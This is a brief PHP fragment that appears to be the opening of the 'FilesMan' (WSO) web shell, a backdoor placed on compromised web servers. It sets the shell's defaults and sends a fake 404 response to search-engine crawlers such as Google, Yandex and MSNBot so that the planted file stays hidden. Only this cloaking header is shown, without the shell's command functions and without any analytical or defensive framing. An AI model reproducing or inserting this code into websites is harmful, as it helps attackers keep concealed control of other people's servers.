<?php
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';

$userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
    header('HTTP/1.0 404 Not Found');
	die();
}
?>